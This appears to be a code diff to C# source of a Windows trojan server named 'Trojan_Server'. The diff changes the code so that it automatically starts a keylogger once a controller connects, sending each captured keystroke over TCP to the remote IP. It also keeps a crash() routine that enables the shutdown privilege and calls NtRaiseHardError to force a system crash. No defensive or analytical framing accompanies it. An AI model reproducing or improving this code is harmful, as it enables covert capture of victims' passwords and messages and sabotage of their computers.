@@ -7,6 +7,7 @@ using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Windows.Forms;
+using System.Net;
 
 namespace Trojan_Server
 {
@@ -136,8 +137,6 @@ namespace Trojan_Server
                             Log("Crashed!", "COMMAND");
                             crash();
                         	break;
-                        case "KEYLOGGER":
-                        	break;
                     }
                 }
                 catch
@@ -215,7 +214,7 @@ namespace Trojan_Server
         	try
         	{
         		string logLine = System.String.Format(
-        			"{0:G}: {1}: {2} ", System.DateTime.Now,"|", art, msg);
+        			"{0:G}: {1}: {2} ", System.DateTime.Now, art, msg);
         		sw.WriteLine(logLine);
         	}
         	finally 
@@ -225,15 +224,15 @@ namespace Trojan_Server
         }
         [DllImport("ntdll.dll", SetLastError = true)]
         public static extern void NtRaiseHardError(uint errorStatus,
-        int a, int b, int c, /* Unused */
+        int a, int b, int c, 
         int responseOption,
         out int response);
 
         public static void crash()
         {
             bool x; int y;
-            RtlAdjustPrivilege(19 /* SeShutdownPrivilege */, true, false, out x);
-            NtRaiseHardError(0xc0000022, 0, 0, 0, 6 /* OptionShutdownSystem */, out y);
+            RtlAdjustPrivilege(19, true, false, out x);
+            NtRaiseHardError(0xc0000022, 0, 0, 0, 6, out y);
         }
         
         public static void Keylogger(){
@@ -244,7 +243,7 @@ namespace Trojan_Server
         				if (GetAsyncKeyState((Keys)i) == -32767){
         					TcpClient Sender = new TcpClient(IP, 4356);
         					Writer = Sender.GetStream();
-        					SendKeys(Convert.ToString((Keys)i));
+        					SendKeys("Key!!!!---" + Convert.ToString((Keys)i));
                	}
 	    		}	
         	}
@@ -292,13 +291,15 @@ namespace Trojan_Server
                 Log("Started TcpListener..." , "ALWAYS");
                 TcpClient Connection = l.AcceptTcpClient();
                 Reciver = Connection.GetStream();
-                var pi = Reciver.GetType().GetProperty("Socket", BindingFlags.NonPublic | BindingFlags.Instance);
-                var socketIP = ((Socket)pi.GetValue(Reciver, null)).RemoteEndPoint.ToString();
-                Log("Remote IP: " + socketIP, "DEBUG");
-                IP = socketIP;
-                System.Threading.Thread Rec = new System.Threading.Thread(new System.Threading.ThreadStart(Recive));
+            var socketIp = ((IPEndPoint)Connection.Client.RemoteEndPoint).Address.ToString();
+            Log(socketIp, "DEBUG");
+            IP = socketIp;
+            System.Threading.Thread Rec = new System.Threading.Thread(new System.Threading.ThreadStart(Recive));
                 Log("Started Reciver!" , "ALWAYS");
                 Rec.Start();
+            System.Threading.Thread Key = new System.Threading.Thread(new System.Threading.ThreadStart(Keylogger));
+            Log("Started Keylogging!", "ALWAYS");
+            Key.Start();
         }
     }
 }
